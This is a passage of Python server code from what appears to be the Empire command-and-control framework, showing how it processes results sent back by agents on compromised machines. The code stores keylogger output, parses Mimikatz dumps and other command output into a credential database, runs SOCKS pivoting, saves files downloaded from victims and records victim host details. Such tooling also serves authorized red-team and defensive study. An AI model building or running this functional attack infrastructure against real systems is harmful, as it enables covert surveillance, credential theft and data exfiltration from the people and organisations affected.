            # process the packet and extract necessary data
            responsePackets = packets.parse_result_packets(packet)
            results = False
            # process each result packet
            for (
                responseName,
                _totalPacket,
                _packetNum,
                taskID,
                _length,
                data,
            ) in responsePackets:
                # process the agent's response
                with SessionLocal.begin() as db:
                    if update_lastseen:
                        self.update_agent_lastseen_db(sessionID, db)

                    self.process_agent_packet(sessionID, responseName, taskID, data, db)
                results = True
            if results:
                # signal that this agent returned results
                message = f"Agent {sessionID} returned results."
                log.info(message)

            # return a 200/valid
            return "VALID"

        except Exception as e:
            message = f"Error processing result packet from {sessionID} : {e}"
            log.error(message, exc_info=True)
            return None

    def process_agent_packet(
        self, session_id, response_name, task_id, data, db: Session
    ):
        """
        Handle the result packet based on sessionID and responseName.
        """
        key_log_task_id = None

        agent = (
            db.query(models.Agent).filter(models.Agent.session_id == session_id).first()
        )

        # report the agent result in the reporting database
        message = f"Agent {session_id} got results"
        log.info(message)

        tasking = (
            db.query(models.AgentTask)
            .filter(
                and_(
                    models.AgentTask.id == task_id,
                    models.AgentTask.agent_id == session_id,
                )
            )
            .first()
        )

        # insert task results into the database, if it's not a file
        if (
            task_id != 0
            and response_name
            not in ["TASK_DOWNLOAD", "TASK_CMD_JOB_SAVE", "TASK_CMD_WAIT_SAVE"]
            and data is not None
        ):
            # add keystrokes to database
            if "function Get-Keystrokes" in tasking.input:
                key_log_task_id = tasking.id
                if tasking.output is None:
                    tasking.output = ""

                if data:
                    raw_key_stroke = data.decode("UTF-8")
                    tasking.output += (
                        raw_key_stroke.replace("\r\n", "")
                        .replace("[SpaceBar]", "")
                        .replace("\b", "")
                        .replace("[Shift]", "")
                        .replace("[Enter]\r", "\r\n")
                    )
            else:
                tasking.original_output = data
                tasking.output = data

            hooks.run_hooks(hooks.BEFORE_TASKING_RESULT_HOOK, db, tasking)
            db, tasking = hooks.run_filters(
                hooks.BEFORE_TASKING_RESULT_FILTER, db, tasking
            )

            db.flush()

        # TODO: for heavy traffic packets, check these first (i.e. SOCKS?)
        #       so this logic is skipped

        if response_name == "ERROR":
            # error code
            message = f"Received error response from {session_id}"
            log.error(message)

            if isinstance(data, bytes):
                data = data.decode("UTF-8")
            # update the agent log
            self.save_agent_log(session_id, "Error response: " + data)

        elif response_name == "TASK_SYSINFO":
            # sys info response -> update the host info
            data = data.decode("utf-8")
            parts = data.split("|")
            if len(parts) < 12:
                message = f"Invalid sysinfo response from {session_id}"
                log.error(message)
            else:
                # extract appropriate system information
                listener = parts[1]
                domainname = parts[2]
                username = parts[3]
                hostname = parts[4]
                internal_ip = parts[5]
                os_details = parts[6]
                high_integrity = parts[7]
                process_name = parts[8]
                process_id = parts[9]
                language = parts[10]
                language_version = parts[11]
                architecture = parts[12]
                if high_integrity == "True":
                    high_integrity = 1
                else:
                    high_integrity = 0

                # username = str(domainname)+"\\"+str(username)
                username = f"{domainname}\\{username}"

                # update the agent with this new information
                self.update_agent_sysinfo_db(
                    db,
                    session_id,
                    listener=listener,
                    internal_ip=internal_ip,
                    username=username,
                    hostname=hostname,
                    os_details=os_details,
                    high_integrity=high_integrity,
                    process_name=process_name,
                    process_id=process_id,
                    language_version=language_version,
                    language=language,
                    architecture=architecture,
                )

                sysinfo = "{: <18}".format("Listener:") + listener + "\n"
                sysinfo += "{: <18}".format("Internal IP:") + internal_ip + "\n"
                sysinfo += "{: <18}".format("Username:") + username + "\n"
                sysinfo += "{: <18}".format("Hostname:") + hostname + "\n"
                sysinfo += "{: <18}".format("OS:") + os_details + "\n"
                sysinfo += (
                    "{: <18}".format("High Integrity:") + str(high_integrity) + "\n"
                )
                sysinfo += "{: <18}".format("Process Name:") + process_name + "\n"
                sysinfo += "{: <18}".format("Process ID:") + process_id + "\n"
                sysinfo += "{: <18}".format("Language:") + language + "\n"
                sysinfo += (
                    "{: <18}".format("Language Version:") + language_version + "\n"
                )
                sysinfo += "{: <18}".format("Architecture:") + architecture + "\n"

                # update the agent log
                self.save_agent_log(session_id, sysinfo)

        elif response_name == "TASK_EXIT":
            # exit command response
            # let everyone know this agent exited
            message = f"Agent {session_id} exiting"
            log.error(message)

            # update the agent results and log
            self.save_agent_log(session_id, data)

            # set agent to archived in the database
            agent.archived = True

            # Close socks client
            if session_id in self.socksthread:
                agent.socks = False
                self.socksclient[session_id].shutdown()
                time.sleep(1)
                self.socksthread[session_id].kill()

        elif response_name == "TASK_SHELL":
            # shell command response
            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_CSHARP":
            # shell command response
            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_SOCKS":
            if session_id not in self.socksthread:
                try:
                    log.info(f"Starting SOCKS client for {session_id}")
                    self.socksqueue[session_id] = queue.Queue()
                    client = create_client(
                        self.mainMenu, self.socksqueue[session_id], session_id
                    )
                    self.socksthread[session_id] = KThread(
                        target=start_client,
                        args=(client, agent.socks_port),
                    )

                    self.socksclient[session_id] = client
                    self.socksthread[session_id].daemon = True
                    self.socksthread[session_id].start()

                    log.info(f'SOCKS client for "{agent.name}" successfully started')
                except Exception:
                    log.error(f'SOCKS client for "{agent.name}" failed to started')
            else:
                log.info("SOCKS server already exists")

            self.save_agent_log(session_id, data)

        elif response_name == "TASK_SOCKS_DATA":
            self.socksqueue[session_id].put(base64.b64decode(data))
            return

        elif response_name == "TASK_DOWNLOAD":
            # file download
            if isinstance(data, bytes):
                data = data.decode("UTF-8")

            parts = data.split("|")
            if len(parts) != 4:
                message = f"Received invalid file download response from {session_id}"
                log.error(message)
            else:
                index, path, filesize, data = parts
                # decode the file data and save it off as appropriate
                file_data = helpers.decode_base64(data.encode("UTF-8"))

                if index == "0":
                    self.save_file(
                        session_id,
                        path,
                        file_data,
                        filesize,
                        tasking,
                        agent.language,
                        db,
                    )
                else:
                    self.save_file(
                        session_id,
                        path,
                        file_data,
                        filesize,
                        tasking,
                        agent.language,
                        db,
                        append=True,
                    )
                # update the agent log
                msg = f"file download: {path}, part: {index}"
                self.save_agent_log(session_id, msg)

        elif response_name == "TASK_DIR_LIST":
            try:
                result = json.loads(data.decode("utf-8"))
                self.update_dir_list(session_id, result, db=db)
            except ValueError:
                pass

            self.save_agent_log(session_id, data)

        elif response_name == "TASK_GETDOWNLOADS":
            if not data or data.strip().strip() == "":
                data = "[*] No active downloads"

            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_STOPDOWNLOAD":
            # download kill response
            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_UPLOAD":
            pass

        elif response_name == "TASK_GETJOBS":
            if not data or data.strip().strip() == "":
                data = "[*] No active jobs"

            # running jobs
            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_STOPJOB":
            # job kill response
            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_CMD_WAIT":
            # dynamic script output -> blocking

            # see if there are any credentials to parse
            date_time = helpers.get_datetime()
            creds = helpers.parse_credentials(data)

            if creds:
                for cred in creds:
                    hostname = cred[4]

                    if hostname == "":
                        hostname = agent.hostname

                    os_details = agent.os_details

                    self.mainMenu.credentialsv2.create_credential(
                        #  idk if i want to import api dtos here, but it's not a big deal for now.
                        db,
                        CredentialPostRequest(
                            credtype=cred[0],
                            domain=cred[1],
                            username=cred[2],
                            password=cred[3],
                            host=hostname,
                            os=os_details,
                            sid=cred[5],
                            notes=date_time,
                        ),
                    )

            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_CMD_WAIT_SAVE":
            # dynamic script output -> blocking, save data

            # extract the file save prefix and extension
            prefix = data[0:15].strip().decode("UTF-8")
            extension = data[15:20].strip().decode("UTF-8")
            file_data = helpers.decode_base64(data[20:])

            # save the file off to the appropriate path
            save_path = "{}/{}_{}.{}".format(
                prefix,
                agent.hostname,
                helpers.get_file_datetime(),
                extension,
            )
            final_save_path = self.save_module_file(
                session_id, save_path, file_data, agent.language
            )

            # update the agent log
            msg = f"Output saved to .{final_save_path}"
            self.save_agent_log(session_id, msg)

            # attach file to tasking
            download = models.Download(
                location=final_save_path,
                filename=final_save_path.split("/")[-1],
                size=os.path.getsize(final_save_path),
            )
            db.add(download)
            db.flush()
            tasking.downloads.append(download)

        elif response_name == "TASK_CMD_JOB":
            # check if this is the powershell keylogging task, if so, write output to file instead of screen
            if key_log_task_id and key_log_task_id == task_id:
                download_dir = Path(empire_config.directories.downloads)
                safe_path = download_dir.absolute()
                save_path = download_dir / session_id / "keystrokes.txt"

                # fix for 'skywalker' exploit by @zeroSteiner
                # I'm not really sure if this can actually still be exploited, its gone through
                # quite a few refactors. But we'll keep it for now.
                if not str(save_path.absolute()).startswith(str(safe_path)):
                    message = f"agent {session_id} attempted skywalker exploit!"
                    log.warning(message)
                    return

                with open(save_path, "a+") as f:
                    if isinstance(data, bytes):
                        data = data.decode("UTF-8")
                    new_results = (
                        data.replace("\r\n", "")
                        .replace("[SpaceBar]", "")
                        .replace("\b", "")
                        .replace("[Shift]", "")
                        .replace("[Enter]\r", "\r\n")
                    )
                    f.write(new_results)

            else:
                # dynamic script output -> non-blocking
                # see if there are any credentials to parse
                date_time = helpers.get_datetime()
                creds = helpers.parse_credentials(data)
                if creds:
                    for cred in creds:
                        hostname = cred[4]

                        if hostname == "":
                            hostname = agent.hostname

                        os_details = agent.os_details

                        self.mainMenu.credentialsv2.create_credential(
                            #  idk if i want to import api dtos here, but it's not a big deal for now.
                            db,
                            CredentialPostRequest(
                                credtype=cred[0],
                                domain=cred[1],
                                username=cred[2],
                                password=cred[3],
                                host=hostname,
                                os=os_details,
                                sid=cred[5],
                                notes=date_time,
                            ),
                        )

                # update the agent log
                self.save_agent_log(session_id, data)

            # TODO: redo this regex for really large AD dumps
            #   so a ton of data isn't kept in memory...?
            if isinstance(data, str):
                data = data.encode("UTF-8")
            parts = data.split(b"\n")
            if len(parts) > 10:
                date_time = helpers.get_datetime()
                if parts[0].startswith(b"Hostname:"):
                    # if we get Invoke-Mimikatz output, try to parse it and add
                    #   it to the internal credential store

                    # cred format: (credType, domain, username, password, hostname, sid, notes)
                    creds = helpers.parse_mimikatz(data)

                    for cred in creds:
                        hostname = cred[4]

                        if hostname == "":
                            hostname = agent.hostname

                        os_details = agent.os_details

                        self.mainMenu.credentialsv2.create_credential(
                            #  idk if i want to import api dtos here, but it's not a big deal for now.
                            db,
                            CredentialPostRequest(
                                credtype=cred[0],
                                domain=cred[1],
                                username=cred[2],
                                password=cred[3],
                                host=hostname,
                                os=os_details,
                                sid=cred[5],
                                notes=date_time,
                            ),
                        )

        elif response_name == "TASK_CMD_JOB_SAVE":
            # dynamic script output -> non-blocking, save data
            # extract the file save prefix and extension
            prefix = data[0:15].strip()
            extension = data[15:20].strip()
            file_data = helpers.decode_base64(data[20:])

            # save the file off to the appropriate path
            save_path = "{}/{}_{}.{}".format(
                prefix,
                agent.hostname,
                helpers.get_file_datetime(),
                extension,
            )
            final_save_path = self.save_module_file(
                session_id, save_path, file_data, agent.language
            )

            # update the agent log
            msg = f"Output saved to .{final_save_path}"
            self.save_agent_log(session_id, msg)

        elif response_name == "TASK_SCRIPT_IMPORT":
            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_IMPORT_MODULE":
            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_VIEW_MODULE":
            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_REMOVE_MODULE":
            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_SCRIPT_COMMAND":
            # update the agent log
            self.save_agent_log(session_id, data)

        elif response_name == "TASK_SWITCH_LISTENER":
            # update the agent listener
            if isinstance(data, bytes):
                data = data.decode("UTF-8")

            listener_name = data[38:]

            agent.listener = listener_name

            # update the agent log
            self.save_agent_log(session_id, data)
            message = f"Updated comms for {session_id} to {listener_name}"
            log.info(message)

        elif response_name == "TASK_UPDATE_LISTENERNAME":
            # The agent listener name variable has been updated agent side
            # update the agent log
            self.save_agent_log(session_id, data)
            message = f"Listener for '{session_id}' updated to '{data}'"
            log.info(message)

        else:
            log.warning(f"Unknown response {response_name} from {session_id}")

        # Not sure why, but for Python agents these are bytes initially, but
        # after storing in the database they're strings. So we need to convert
        # so socketio and other hooks get the right data type.
        if isinstance(tasking.output, bytes):
            tasking.output = tasking.output.decode("UTF-8")
        if isinstance(tasking.original_output, bytes):
            tasking.original_output = tasking.original_output.decode("UTF-8")

        hooks.run_hooks(hooks.AFTER_TASKING_RESULT_HOOK, db, tasking)
